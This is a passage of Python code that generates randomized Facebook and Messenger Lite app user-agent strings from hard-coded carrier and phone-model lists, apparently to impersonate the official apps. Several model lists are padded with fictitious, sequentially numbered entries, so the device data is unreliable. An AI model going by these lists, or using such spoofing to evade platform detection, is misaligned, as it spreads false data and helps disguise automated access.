            'SM-G930',
            'SM-G920',
            'SM-G900',
            'GT-I9500',
            'GT-I9300',
            'GT-I9100',
            'GT-I9000',
            'SM-N981',
            'SM-N970',
            'SM-N960',
            'SM-N950',
            'SM-N920',
            'SM-N910',
            'SM-N900',
            'GT-N7100',
            'GT-N7000',
            'SM-A526B',
            'SM-A516B',
            'SM-A516N',
            'SM-A526U',
            'SM-A716U',
            'SM-A716V',
            'SM-A5260',
            'SM-A526W',
            'SM-A126U',
            'SM-A126V',
            'SM-A016G',
            'SM-A016B',
            'SM-A016M',
            'SM-A025M',
            'SM-A025F',
            'SM-A217F',
            'SM-A217M',
            'SM-A207F',
            'SM-A207M',
            'SM-A102U',
            'SM-A102U1',
            'SM-A102W',
            'SM-A102N',
            'SM-A1020',
            'SM-A105F',
            'SM-A105G',
            'SM-A105M',
            'SM-A202F',
            'SM-A202G',
            'SM-A202M',
            'SM-A125U',
            'SM-A125V',
            'SM-A022G',
            'SM-A022M',
            'SM-A027G',
            'SM-A027M',
            'SM-A2170',
            'SM-A115M',
            'SM-A107M',
            'SM-A107F',
            'SM-A107M',
            'SM-A0220',
            'SM-A115F',
            'SM-A102F',
            'SM-A1050'])
    if katana7 == 'infinix':
        katana11 = random.choice([
            'Infinix X608',
            'Infinix X606B',
            'Infinix X559C',
            'Infinix Zero 3',
            'Infinix X5515F',
            'Infinix Hot 4 Pro',
            'Infinix X510',
            'X676B',
            'X687',
            'X609',
            'X697',
            'X680D',
            'X507',
            'X605',
            'X668',
            'X6815B',
            'X624',
            'X655F',
            'X689C',
            'X608',
            'X698',
            'X682B',
            'X682C',
            'X688C',
            'X688B',
            'X658E',
            'X659B',
            'X689B',
            'X689',
            'X689D',
            'X662',
            'X662B',
            'X675',
            'X6812B',
            'X6812',
            'X6817B',
            'X6817',
            'X6816C',
            'X6816',
            'X6816D',
            'X668C',
            'X665B',
            'X665E',
            'X510',
            'X559C',
            'X559F',
            'X559',
            'X606',
            'X606C',
            'X606D',
            'X623',
            'X624B',
            'X625C',
            'X625D',
            'X625B',
            'X650D',
            'X650B',
            'X650',
            'X650C',
            'X655C',
            'X655D',
            'X680B',
            'X573',
            'X573B',
            'X622',
            'X693',
            'X695C',
            'X695D',
            'X695',
            'X663B',
            'X663',
            'X670',
            'X671',
            'X671B',
            'X672',
            'X6819',
            'X572',
            'X572-LTE',
            'X571',
            'X604',
            'X610B',
            'X690',
            'X690B',
            'X656',
            'X692',
            'X683',
            'X450',
            'X5010',
            'X501',
            'X401',
            'X626',
            'X626B',
            'X652',
            'X652A',
            'X652B',
            'X652C',
            'X660B',
            'X660C',
            'X660',
            'X5515',
            'X5515F',
            'X5515I',
            'X609B',
            'X5514D',
            'X5516B',
            'X5516C',
            'X627',
            'X680',
            'X653',
            'X653C',
            'X657',
            'X657B',
            'X657C',
            'X6511B',
            'X6511E',
            'X6511',
            'X6512',
            'X6823C',
            'X612B',
            'X612',
            'X503',
            'X511',
            'X352',
            'X351',
            'X530',
            'X676C',
            'X6821',
            'X6823',
            'X6827',
            'X509',
            'X603',
            'X6815',
            'X620B',
            'X620',
            'X687B',
            'X6811B',
            'X6810',
            'X6811'])
    katana8 = ';FBBD/'
    katana9 = katana7
    katana10 = ';FBPN/com.facebook.katana;FBDV/'
    katana12 = ';FBSV/' + str(random.randint(9, 12)) + ';FBOP/1;FBCA/arm64-v8a:]'
    mess1 = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';' + '[FBAN/MessengerLite;FBAV/' + str(random.randint(199, 399)) + '.0.0.' + str(random.randint(1, 9)) + '.' + str(random.randint(99, 199)) + ';FBPN/com.facebook.mlite;FBLC/'
    mess2 = 'en_US'
    mess3 = ';FBBV/' + str(random.randint(111111111, 999999999)) + ';FBCR/'
    mess4 = random.choice([
        'GLOBE',
        'TNT',
        'SMART',
        'DITO',
        'TM',
        'Verizon'])
    mess5 = ';FBMF/'
    mess6 = random.choice([
        'samsung',
        'infinix',
        'xiaomi',
        'vivo',
        'oppo',
        'motorola',
        'realme',
        'sony',
        'tecno',
        'itel',
        'meizu',
        'asus'])
    mess7 = ';FBBD/'
    mess8 = mess6
    mess9 = ';FBDV/'
    if mess6 == 'asus':
        mess10 = random.choice([
            'ZenFone 8',
            'ROG Phone 5',
            'ZenFone 7',
            'ROG Phone 3',
            'ZenFone 6',
            'ROG Phone II',
            'ZenFone 5Z',
            'ZenFone 5',
            'ZenFone 4 Pro',
            'ZenFone 4',
            'ZenFone 3 Deluxe',
            'ZenFone 3',
            'ZenFone 2 Laser',
            'ZenFone 2',
            'ZenFone',
            'ZenFone 6Z',
            'ZenFone Max Pro (M2)',
            'ZenFone Max Pro (M1)',
            'ZenFone 6Z',
            'ZenFone Max Plus (M2)',
            'ZenFone Max (M2)',
            'ZenFone Max (M1)',
            'ZenFone Live',
            'ZenFone Zoom',
            'ZenFone Selfie',
            'ASUS_Z01RD',
            'ASUS_Z01QD',
            'ASUS_I01WD',
            'ASUS_I01BD',
            'ASUS_I01HDA'])
    if mess6 == 'meizu':
        mess10 = random.choice([
            'Meizu 18s',
            'Meizu 18',
            'Meizu 17 Pro',
            'Meizu 17',
            'Meizu 16s Pro',
            'Meizu 16s',
            'Meizu 16T',
            'Meizu 16Xs',
            'Meizu 16X',
            'Meizu 16th Plus',
            'Meizu 16th',
            'Meizu 15 Plus',
            'Meizu 15',
            'Meizu 15 Lite',
            'Meizu 16s Plus',
            'Meizu 16',
            'Meizu 16 Max',
            'Meizu 16 Note',
            'Meizu 16s Plus',
            'Meizu 16',
            'Meizu 16X',
            'Meizu 16th Plus',
            'Meizu 16th',
            'Meizu 15 Plus',
            'Meizu 15',
            'Meizu 15 Lite',
            'Meizu M6T',
            'Meizu M6s',
            'Meizu M6 Note',
            'Meizu M6',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5'])
    if mess6 == 'itel':
        mess10 = random.choice([
            'S41',
            'S31',
            'S21',
            'S12',
            'S11',
            'A56',
            'A55',
            'A54',
            'A23',
            'A16',
            'A15',
            'P36 Pro',
            'P36',
            'P33 Plus',
            'P33',
            'P32',
            'P31',
            'A88',
            'A47',
            'A46',
            'A45',
            'A44',
            'A41 Plus',
            'A41',
            'A25 Pro',
            'A25',
            'A23 Pro',
            'A22 Pro',
            'A22',
            'A21',
            'A16 Plus',
            'A16S',
            'A16',
            'A14',
            'A13 Plus',
            'A13',
            'A11',
            'A10',
            'Vision 1 Plus',
            'Vision 1',
            'S13 Pro',
            'S13',
            'S12 Lite',
            'S11 Lite',
            'S11 Pro',
            'S11 Plus',
            'S10',
            'S15',
            'S14',
            'S13P',
            'S12',
            'S11',
            'S10',
            'S15',
            'S14',
            'S13P',
            'S12',
            'S11',
            'S10',
            'S15',
            'S14',
            'S13P',
            'S12',
            'S11',
            'S10'])
    if mess6 == 'tecno':
        mess10 = random.choice([
            'Camon 16 Premier',
            'Camon 16 Pro',
            'Camon 16',
            'Camon 15 Premier',
            'Camon 15 Pro',
            'Camon 15',
            'Spark 6',
            'Spark 5 Pro',
            'Spark 5',
            'Pova',
            'Pouvoir 4 Pro',
            'Pouvoir 4',
            'Phantom 9',
            'Phantom X',
            'Camon 12 Pro',
            'Camon 12',
            'Camon 11',
            'Camon 11 Pro',
            'Camon 11S',
            'Spark 4',
            'Spark 4 Air',
            'Spark 3 Pro',
            'Spark 3',
            'Spark 2',
            'Pouvoir 3 Plus',
            'Pouvoir 3',
            'Phantom 8',
            'Phantom 6',
            'Phantom 6 Plus',
            'Camon X Pro',
            'Camon X',
            'Camon CM',
            'Camon CX Air',
            'Camon CX',
            'Spark Plus K9',
            'Spark K7',
            'Spark Plus K9',
            'Spark K7 Plus',
            'Boom J8',
            'Boom J7',
            'Boom J5',
            'Boom J9 Plus',
            'Boom J10',
            'Pop 3',
            'Pop 2 Plus',
            'Pop 2 Power',
            'Pop 2F',
            'Pop 1',
            'F1',
            'F2',
            'F3',
            'F4',
            'F5'])
    if mess6 == 'sony':
        mess10 = random.choice([
            'Xperia 1',
            'Xperia 5',
            'Xperia 10',
            'Xperia L4',
            'Xperia XZ3',
            'Xperia XZ2',
            'Xperia XZ1',
            'Xperia XA2',
            'Xperia XA1',
            'Xperia XZs',
            'Xperia XZ',
            'Xperia X Compact',
            'Xperia XA Ultra',
            'Xperia XA',
            'Xperia X Performance',
            'Xperia XA1 Ultra',
            'Xperia XA2 Ultra',
            'Xperia XZ2 Premium',
            'Xperia XZ2 Compact',
            'Xperia 10 Plus',
            'Xperia L3',
            'Xperia 1 II',
            'Xperia 5 II',
            'Xperia 10 II',
            'Xperia 10 III',
            'Xperia L5',
            'Xperia XZ4',
            'Xperia XZ4 Compact',
            'Xperia XZ Premium',
            'Xperia XZ1 Compact',
            'Xperia XA3',
            'Xperia XA4',
            'Xperia XA5',
            'Xperia XA6',
            'Xperia XA7',
            'Xperia XA8',
            'Xperia XA9',
            'Xperia XA10',
            'Xperia XA11',
            'Xperia XA12',
            'Xperia XA13',
            'Xperia XA14',
            'Xperia XA15',
            'Xperia XA16',
            'Xperia XA17',
            'Xperia XA18',
            'Xperia XA19',
            'Xperia XA20',
            'Xperia XA21',
            'Xperia XA22',
            'Xperia XA23',
            'Xperia XA24',
            'Xperia XA25',
            'Xperia XA26',
            'Xperia XA27',
            'Xperia XA28',
            'Xperia XA29',
            'Xperia XA30',
            'Xperia XA31',
            'Xperia XA32',
            'Xperia XA33',
            'Xperia XA34',
            'Xperia XA35',
            'Xperia XA36',
            'Xperia XA37',
            'Xperia XA38',
            'Xperia XA39',
            'Xperia XA40',
            'Xperia XA41',
            'Xperia XA42'])
    if mess6 == 'realme':
        mess10 = random.choice([
            'RMX3516',
            'RMX3371',
            'RMX3461',
            'RMX3286',
            'RMX3561',
            'RMX3388',
            'RMX3311',
            'RMX3142',
            'RMX2071',
            'RMX1805',
            'RMX1809',
            'RMX1801',
            'RMX1807',
            'RMX1803',
            'RMX1825',
            'RMX1821',
            'RMX1822',
            'RMX1833',
            'RMX1851',
            'RMX1853',
            'RMX1827',
            'RMX1911',
            'RMX1919',
            'RMX1927',
            'RMX1971',
            'RMX1973',
            'RMX2030',
            'RMX2032',
            'RMX1925',
            'RMX1929',
            'RMX2001',
            'RMX2061',
            'RMX2063',
            'RMX2040',
            'RMX2042',
            'RMX2002',
            'RMX2151',
            'RMX2163',
            'RMX2155',
            'RMX2170',
            'RMX2103',
            'RMX3085',
            'RMX3241',
            'RMX3081',
            'RMX3151',
            'RMX3381',
            'RMX3521',
            'RMX3474',
            'RMX3471',
            'RMX3472',
            'RMX3392',
            'RMX3393',
            'RMX3491',
            'RMX1811',
            'RMX2185',
            'RMX3231',
            'RMX2189',
            'RMX2180',
            'RMX2195',
            'RMX2101',
            'RMX1941',
            'RMX1945',
            'RMX3063',
            'RMX3061',
            'RMX3201',
            'RMX3203',
            'RMX3261',
            'RMX3263',
            'RMX3193',
            'RMX3191',
            'RMX3195',
            'RMX3197',
            'RMX3265',
            'RMX3268',
            'RMX3269',
            'RMX2027',
            'RMX2020',
            'RMX2021',
            'RMX3581',
            'RMX3501',
            'RMX3503',
            'RMX3511',
            'RMX3310',
            'RMX3312',
            'RMX3551',
            'RMX3301',
            'RMX3300',
            'RMX2202',
            'RMX3363',
            'RMX3360',
            'RMX3366',
            'RMX3361',
            'RMX3031',
            'RMX3370',
            'RMX3357',
            'RMX3560',
            'RMX3562',
            'RMX3350',
            'RMX2193',
            'RMX2161',
            'RMX2050',
            'RMX2156',
            'RMX3242',
            'RMX3171',
            'RMX3430',
            'RMX3235',
            'RMX3506',
            'RMX2117',
            'RMX2173',
            'RMX3161',
            'RMX2205',
            'RMX3462',
            'RMX3478',
            'RMX3372',
            'RMX3574',
            'RMX1831',
            'RMX3121',
            'RMX3122',
            'RMX3125',
            'RMX3043',
            'RMX3042',
            'RMX3041',
            'RMX3092',
            'RMX3093',
            'RMX3571',
            'RMX3475',
            'RMX2200',
            'RMX2201',
            'RMX2111',
            'RMX2112',
            'RMX1901',
            'RMX1903',
            'RMX1992',
            'RMX1993',
            'RMX1991',
            'RMX1931',
            'RMX2142',
            'RMX2081',
            'RMX2085',
            'RMX2083',
            'RMX2086',
            'RMX2144',
            'RMX2051',
            'RMX2025',
            'RMX2075',
            'RMX2076',
            'RMX2072',
            'RMX2052',
            'RMX2176',
            'RMX2121',
            'RMX3115',
            'RMX1921'])
    if mess6 == 'motorola':
        mess10 = random.choice([
            'Moto G100',
            'Moto G60',
            'Moto G40 Fusion',
            'Moto G30',
            'Moto G9 Power',
            'Moto G8',
            'Moto G Power 2022',
            'Moto G7',
            'Moto G Stylus 2022',
            'Motorola Edge 20 Pro',
            'Motorola Edge 20',
            'Motorola Edge 20 Lite',
            'Motorola Moto G Stylus (2021)',
            'Motorola Moto G Power (2021)',
            'Motorola Moto G Play (2021)',
            'Motorola Moto G9 Plus',
            'Motorola Moto G9',
            'Motorola Moto G8 Plus',
            'Motorola Moto G8 Power',
            'Motorola Moto G8',
            'Motorola Moto G7 Plus',
            'Motorola Moto G7 Power',
            'Motorola Moto G7 Play',
            'Motorola Moto G7',
            'Motorola Moto G6 Plus',
            'Motorola Moto G6',
            'Motorola Moto G5S Plus',
            'Motorola Moto G5 Plus',
            'Motorola Moto G5',
            'Motorola Moto G4 Plus',
            'Motorola Moto G4',
            'Motorola Moto X4',
            'Motorola Moto X (2nd Gen)',
            'Motorola Moto X',
            'Motorola Moto Z3 Play',
            'Motorola Moto Z2 Play',
            'Motorola Moto Z',
            'Motorola Moto E7 Plus',
            'Motorola Moto E6 Plus',
            'Motorola Moto E5 Plus',
            'Motorola Moto E4 Plus',
            'Motorola Moto E (2nd Gen)',
            'Motorola Moto E',
            'XT2127-2',
            'XT2127-4',
            'XT2127-5',
            'XT2127-6',
            'XT2127-7',
            'XT2127-8',
            'XT2127-10',
            'XT2127-11',
            'XT2127-12',
            'XT2127-13',
            'XT2127-14',
            'XT2127-15',
            'XT2127-16',
            'XT2127-17',
            'XT2127-18',
            'XT2127-19',
            'XT2127-20',
            'XT2127-21',
            'XT2127-22',
            'XT2127-23',
            'XT2127-24',
            'XT2127-25',
            'XT2127-26',
            'XT2127-27',
            'XT2127-28',
            'XT2127-29',
            'XT2127-30',
            'XT2127-31',
            'XT2127-32',
            'XT2127-33',
            'XT2127-34',
            'XT2127-35',
            'XT2127-36',
            'XT2127-37',
            'XT2127-38',
            'XT2127-39',
            'XT2127-40',
            'XT2127-41',
            'XT2127-42',
            'XT2127-43',
            'XT2127-44',
            'XT2127-45',
            'XT2127-46',
            'XT2127-47',
            'XT2127-48',
            'XT2127-49',
            'XT2127-50',
            'XT2127-51',
            'XT2127-52',
            'XT2127-53',
            'XT2127-54',
            'XT2127-55',
            'XT2127-56',
            'XT2127-57',
            'XT2127-58',
            'XT2127-59',
            'XT2127-60',
            'XT2127-61',
            'XT2127-62',
            'XT2127-63',
            'XT2127-64',
            'XT2127-65',
            'XT2127-66',
            'XT2127-67',
            'XT2127-68',
            'XT2127-69',
            'XT2127-70',
            'XT2127-71',
            'XT2127-72',
            'XT2127-73',
            'XT2127-74',
            'XT2127-75',
            'XT2127-76',
            'XT2127-77',
            'XT2127-78',
            'XT2127-79',
            'XT2127-80',
            'XT2127-81',
            'XT2127-82',
            'XT2127-83',
            'XT2127-84',
            'XT2127-85',
            'XT2127-86',
            'XT2127-87',
            'XT2127-88',
            'XT2127-89',
            'XT2127-90',
            'XT2127-91',
            'XT2127-92',
            'XT2127-93',
            'XT2127-94',
            'XT2127-95',
            'XT2127-96',
            'XT2127-97',
            'XT2127-98',
            'XT2127-99',
            'XT2127-100',
            'XT2127-101',
            'XT2127-102',
            'XT2127-103',
            'XT2127-104',
            'XT2127-105',
            'XT2127-106',
            'XT2127-107',
            'XT2127-108',
            'XT2127-109',
            'XT2127-110',
            'XT2127-111',
            'XT2127-112',
            'XT2127-113',
            'XT2127-114',
            'XT2127-115',
            'XT2127-116',
            'XT2127-117',
            'XT2127-118',
            'XT2127-119',
            'XT2127-120',
            'XT2127-121',
            'XT2127-122',
            'XT2127-123',
            'XT2127-124',
            'XT2127-125',
            'XT2127-126',
            'XT2127-127',
            'XT2127-128',
            'XT2127-129',
            'XT2127-130',
            'XT2127-131',
            'XT2127-132',
            'XT2127-133',
            'XT2127-134',
            'XT2127-135',
            'XT2127-136',
            'XT2127-137',
            'XT2127-138',
            'XT2127-139',
            'XT2127-140',
            'XT2127-141',
            'XT2127-142',
            'XT2127-143',
            'XT2127-144',
            'XT2127-145',
            'XT2127-146',
            'XT2127-147',
            'XT2127-148',
            'XT2127-149',
            'XT2127-150',
            'XT2127-151',
            'XT2127-152',
            'XT2127-153'])
    if mess6 == 'oppo':
        mess10 = random.choice([
            'Reno 7 Pro',
            'Reno 7',
            'Reno 6 Pro+',
            'A95',
            'A96',
            'A93',
            'Oppo Find X3 Pro',
            'Oppo Find X2 Pro',
            'Oppo Find X2',
            'Oppo Reno 6 Pro+',
            'Oppo Reno 6 Pro',
            'Oppo Reno 6',
            'Oppo Reno 5 Pro+',
            'Oppo Reno 5 Pro',
            'Oppo Reno 5',
            'Oppo A94',
            'Oppo A74',
            'Oppo F19 Pro+',
            'Oppo F19 Pro',
            'Oppo F19',
            'Oppo A93',
            'Oppo A53',
            'Oppo A33',
            'Oppo A32',
            'Oppo A72',
            'Oppo A52',
            'Oppo A92',
            'Oppo A12',
            'Oppo Reno 3 Pro',
            'Oppo Reno 3',
            'Oppo Reno 2',
            'Oppo Reno',
            'Oppo K7x',
            'Oppo K7',
            'Oppo A9 (2020)',
            'Oppo A5 (2020)',
            'CPH1903',
            'CPH1803',
            'CPH1859',
            'CPH1969',
            'CPH1989',
            'CPH1919',
            'CPH1941',
            'CPH1983',
            'CPH1963',
            'CPH1879',
            'CPH1831',
            'CPH2035',
            'CPH2069',
            'CPH1987',
            'CPH2071',
            'CPH2083',
            'CPH2015',
            'CPH2019',
            'CPH2173',
            'CPH2089',
            'CPH2067',
            'CPH2017',
            'CPH2087',
            'CPH2205',
            'CPH2251',
            'CPH2197',
            'CPH2235',
            'CPH2347',
            'CPH2295',
            'CPH2249',
            'CPH2243',
            'CPH2349',
            'CPH2359',
            'CPH2383',
            'CPH2381',
            'CPH2239',
            'CPH2213',
            'CPH2129',
            'CPH2195',
            'CPH2227',
            'CPH2316',
            'CPH2353',
            'CPH2261',
            'CPH2225',
            'CPH2269',
            'CPH2073',
            'CPH2185',
            'CPH1877',
            'CPH2013',
            'CPH2061',
            'CPH1955',
            'CPH1871',
            'CPH1801',
            'CPH1873',
            'CPH1901',
            'CPH1809',
            'CPH1853',
            'CPH1923',
            'CPH1981',
            'CPH1833',
            'CPH1917',
            'CPH1967',
            'CPH1937',
            'CPH1893',
            'CPH1931',
            'CPH1921',
            'CPH1823',
            'CPH2023',
            'CPH2021',
            'CPH2103',
            'CPH2220',
            'CPH2127',
            'CPH2059',
            'CPH2139',
            'CPH2253',
            'CPH2267',
            'CPH2263',
            'CPH2247',
            'CPH2241',
            'CPH2297',
            'CPH2357',
            'CPH2255',
            'CPH2345',
            'CPH2329',
            'CPH2209',
            'CPH2191',
            'CPH2199',
            'CPH2289',
            'CPH2319',
            'CPH2343',
            'CPH2363',
            'CPH2161',
            'CPH2163',
            'CPH1979',
            'CPH1977',
            'CPH1973',
            'CPH1965',
            'CPH1959',
            'CPH1951',
            'CPH1913',
            'CPH1909',
            'CPH1905',
            'CPH1861',
            'CPH1863',
            'CPH1967',
            'CPH1933',
            'CPH1937',
            'CPH1921',
            'CPH1923',
            'CPH1987',
            'CPH1919',
            'CPH1897',
            'CPH1875',
            'CPH1874',
            'CPH1872',
            'CPH1865',
            'CPH1863',
            'CPH1862',
            'CPH1853',
            'CPH1852',
            'CPH1851',
            'CPH1843',
            'CPH1841',
            'CPH1835',
            'CPH1833',
            'CPH1832',
            'CPH1831',
            'CPH1825',
            'CPH1823',
            'CPH1821',
            'CPH1819',
            'CPH1813',
            'CPH1812',
            'CPH1811',
            'CPH1809',
            'CPH1808',
            'CPH1807',
            'CPH1805',
            'CPH1803',
            'CPH1801'])
    if mess6 == 'vivo':
        mess10 = random.choice([
            'Vivo_X60_Pro',
            'Vivo_X50_Pro',
            'Vivo_X30_Pro',
            'Vivo_X27',
            'Vivo_X23',
            'Vivo_X21',
            'Vivo_V21',
            'Vivo_V17',
            'Vivo_V15',
            'Vivo_V11',
            'Vivo_V9',
            'Vivo_Y95',
            'Vivo_Y91',
            'Vivo_Y81',
            'Vivo_Y71',
            'Vivo_S1',
            'V2056',
            'V2112A',
            'V2112',
            'V2122A',
            'V2120A',
            'V2120',
            'V2116A',
            'V2114A',
            'V2112A',
            'V2010A',
            'V2019A',
            'V2010',
            'V2003A',
            'V2002A',
            'V2002',
            'V1932A',
            'V1932T',
            'V1932',
            'V1929A',
            'V1928A',
            'V1928T',
            'V1928',
            'V1927A',
            'V1926A',
            'V1925A',
            'V1925',
            'V1924A',
            'V1922A',
            'V1921A',
            'V1921',
            'V1920A',
            'V1919A',
            'V1916A',
            'V1916',
            'V1912A',
            'V1911A',
            'V1910A',
            'V1910',
            'V1909A',
            'V1907A',
            'V1905',
            'V1903A',
            'V1901A',
            'V1901T',
            'V1901',
            'V1836',
            'V1824A',
            'V1824T',
            'V1824',
            'V1818A',
            'V1818T',
            'V1813A',
            'V1813T',
            'V1813',
            'V1812A',
            'V1811A',
            'V1811T',
            'V1811',
            'V1808A',
            'V1808T',
            'V1808',
            'V1801A',
            'V1801T',
            'V1801',
            'V1730T',
            'V1730F',
            'V1730A',
            'V1730',
            'V1724A',
            'V1723A',
            'V1723',
            'V1721A',
            'V1720A',
            'V1720T',
            'V1720',
            'V1716A',
            'V1715A',
            'V1715',
            'V1713A',
            'V1713',
            'V1712A',
            'V1712',
            'V1711T',
            'V1711A',
            'V1711',
            'V1709A',
            'V1709T',
            'V1709',
            'V1708A',
            'V1708T',
            'V1707A',
            'V1707T',
            'V1706T',
            'V1706',
            'V1703A',
            'V1701A',
            'V1701',
            'V1624A',
            'V1623A',
            'V1622A',
            'V1622',
            'V1621A',
            'V1619',
            'V1618A',
            'V1617A',
            'V1616',
            'V1615T',
            'V1614T',
            'V1613',
            'V1611T',
            'V1611',
            'V1608A',
            'V1609',
            'V1605',
            'V1604',
            'V1603',
            'V1601',
            'V1570',
            'V1562',
            'V1561',
            'V1550',
            'V1548',
            'V1546',
            'V1543',
            'V1542',
            'V1540',
            'V1530',
            'V1520',
            'V1510',
            'V1500',
            'V1420',
            'V1400',
            'V1310',
            'V1320'])
    if mess6 == 'xiaomi':
        mess10 = random.choice([
            'Mi 11',
            'Mi 10 Pro',
            'Mi 9T',
            'M2101K7AG',
            'M2003J15SC',
            'M2004J19C',
            'M2006C3LG',
            'M2007J20CG',
            'M2010J19CG',
            'M2011K2C',
            'M2012K11AG',
            'M2101K7BG',
            'M2101K9G',
            'M2102J20SG',
            'M2102K1G',
            'M2012K11C',
            'Redmi 6A',
            'M2003J15SC',
            'MI MAX 2',
            'AT&amp;amp-T',
            'Redmi Note 4',
            'Redmi Note 5',
            'Redmi 4X',
            'Redmi Note 8',
            'Redmi Note 8 Pro',
            'Xiaomi Mi 11 Ultra',
            'Xiaomi Mi 11 Pro',
            'Xiaomi Mi 11',
            'Xiaomi Mi 10 Ultra',
            'Xiaomi Mi 10 Pro',
            'Xiaomi Mi 10',
            'Xiaomi Mi 10T Pro',
            'Xiaomi Mi 10T',
            'Xiaomi Mi 9T Pro',
            'Xiaomi Mi 9T',
            'Xiaomi Mi 9 Pro 5G',
            'Xiaomi Mi 9',
            'Xiaomi Mi 8 Pro',
            'Xiaomi Mi 8',
            'Xiaomi Mi 8 Lite',
            'Xiaomi Mi 8 SE',
            'Xiaomi Mi Mix 3',
            'Xiaomi Mi Mix 2S',
            'Xiaomi Mi Mix 2',
            'Xiaomi Mi Mix',
            'Xiaomi Redmi Note 11 Pro+',
            'Xiaomi Redmi Note 11 Pro',
            'Xiaomi Redmi Note 11',
            'Xiaomi Redmi Note 10 Pro',
            'Xiaomi Redmi Note 10',
            'Xiaomi Redmi Note 9 Pro',
            'Xiaomi Redmi Note 9',
            'Xiaomi Redmi Note 8 Pro',
            'Xiaomi Redmi Note 8',
            'Xiaomi Redmi Note 7 Pro',
            'Xiaomi Redmi Note 7',
            'Xiaomi Redmi K40 Pro',
            'Xiaomi Redmi K40',
            'Xiaomi Redmi K30 Pro',
            'Xiaomi Redmi K30',
            'Xiaomi Redmi K20 Pro',
            'Xiaomi Redmi K20',
            'Xiaomi Poco X3 Pro',
            'Xiaomi Poco X3',
            'Xiaomi Poco X2',
            'Xiaomi Poco F3',
            'Xiaomi Poco F2 Pro',
            'Xiaomi Poco F1'])
    if mess6 == 'infinix':
        mess10 = random.choice([
            'Infinix X608',
            'Infinix X606B',
            'Infinix X559C',
            'Infinix Zero 3',
            'Infinix X5515F',
            'Infinix Hot 4 Pro',
            'Infinix X510',
            'X676B',
            'X687',
            'X609',
            'X697',
            'X680D',
            'X507',
            'X605',
            'X668',
            'X6815B',
            'X624',
            'X655F',
            'X689C',
            'X608',
            'X698',
            'X682B',
            'X682C',
            'X688C',
            'X688B',
            'X658E',
            'X659B',
            'X689B',
            'X689',
            'X689D',
            'X662',
            'X662B',
            'X675',
            'X6812B',
            'X6812',
            'X6817B',
            'X6817',
            'X6816C',
            'X6816',
            'X6816D',
            'X668C',
            'X665B',
            'X665E',
            'X510',
            'X559C',
            'X559F',
            'X559',
            'X606',
            'X606C',
            'X606D',
            'X623',
            'X624B',
            'X625C',
            'X625D',
            'X625B',
            'X650D',
            'X650B',
            'X650',
            'X650C',
            'X655C',
            'X655D',
            'X680B',
            'X573',
            'X573B',
            'X622',
            'X693',
            'X695C',
            'X695D',
            'X695',
            'X663B',
            'X663',
            'X670',
            'X671',
            'X671B',
            'X672',
            'X6819',
            'X572',
            'X572-LTE',
            'X571',
            'X604',
            'X610B',
            'X690',
            'X690B',
            'X656',
            'X692',
            'X683',
            'X450',
            'X5010',
            'X501',
            'X401',
            'X626',
            'X626B',
            'X652',
            'X652A',
            'X652B',
            'X652C',
            'X660B',
            'X660C',
            'X660',
            'X5515',
            'X5515F',
            'X5515I',
            'X609B',
            'X5514D',
            'X5516B',
            'X5516C',
            'X627',
            'X680',
            'X653',
            'X653C',
            'X657',
            'X657B',
            'X657C',
            'X6511B',
            'X6511E',
            'X6511',
            'X6512',
            'X6823C',
            'X612B',
            'X612',
            'X503',
            'X511',
            'X352',
            'X351',
            'X530',
            'X676C',
            'X6821',
            'X6823',
            'X6827',
            'X509',
            'X603',
            'X6815',
            'X620B',
            'X620',
            'X687B',
            'X6811B',
            'X6810',
            'X6811'])
    if mess6 == 'samsung':
        mess10 = random.choice([
            'SM-A500F',
            'SM-A500FU',
            'SM-A500H',
            'SM-G532F',
            'SM-G900F',
            'SM-G920F',
            'SM-G930F',
            'SM-G935F',
            'SM-G950F',
            'SM-J320F',
            'SM-J320FN',
            'SM-J320H',
            'SM-J320M',
            'SM-J510FN',
            'SM-J701F',
            'SM-N920S',
            'SM-T111',
            'SM-T230',
            'SM-T231',
            'SM-T235',
            'SM-T280',
            'SM-T311',
            'SM-T315',
            'SM-T525',
            'SM-T531',
            'SM-T535',
            'SM-T555',
            'SM-T561',
            'SM-T705',
            'SM-T805',
            'SM-T820',
            'SPH-L720',
            'SM-S906E',
            'SM-G991',
            'SM-G981',
            'SM-G973',
            'SM-G960',
            'SM-G950',
            'SM-G930',
            'SM-G920',
            'SM-G900',
            'GT-I9500',
            'GT-I9300',
            'GT-I9100',
            'GT-I9000',
            'SM-N981',
            'SM-N970',
            'SM-N960',
            'SM-N950',
            'SM-N920',
            'SM-N910',
            'SM-N900',
            'GT-N7100',
            'GT-N7000',
            'SM-G991',
            'SM-G981',
            'SM-G973',
            'SM-G960',
            'SM-G950',
            'SM-G930',
            'SM-G920',
            'SM-G900',
            'GT-I9500',
            'GT-I9300',
            'GT-I9100',
            'GT-I9000',
            'SM-N981',
            'SM-N970',
            'SM-N960',
            'SM-N950',
            'SM-N920',
            'SM-N910',
            'SM-N900',
            'GT-N7100',
            'GT-N7000',
            'SM-A526B',
            'SM-A516B',
            'SM-A516N',
            'SM-A526U',
            'SM-A716U',
            'SM-A716V',
            'SM-A5260',
            'SM-A526W',
            'SM-A126U',
            'SM-A126V',
            'SM-A016G',
            'SM-A016B',
            'SM-A016M',
            'SM-A025M',
            'SM-A025F',
            'SM-A217F',
            'SM-A217M',
            'SM-A207F',
            'SM-A207M',
            'SM-A102U',
            'SM-A102U1',
            'SM-A102W',
            'SM-A102N',
            'SM-A1020',
            'SM-A105F',
            'SM-A105G',
            'SM-A105M',
            'SM-A202F',
            'SM-A202G',
            'SM-A202M',
            'SM-A125U',
            'SM-A125V',
            'SM-A022G',
            'SM-A022M',
            'SM-A027G',
            'SM-A027M',
            'SM-A2170',
            'SM-A115M',
            'SM-A107M',
            'SM-A107F',
            'SM-A107M',
            'SM-A0220',
            'SM-A115F',
            'SM-A102F',
            'SM-A1050'])
    mess11 = ';FBSV/' + str(random.randint(9, 12)) + ';FBCA/arm64-v8a:null;FBDM/{density=' + str(random.randint(2, 3)) + '.' + str(random.randint(0, 5)) + ',width=720,height=' + str(random.randint(1400, 1499)) + '};]'
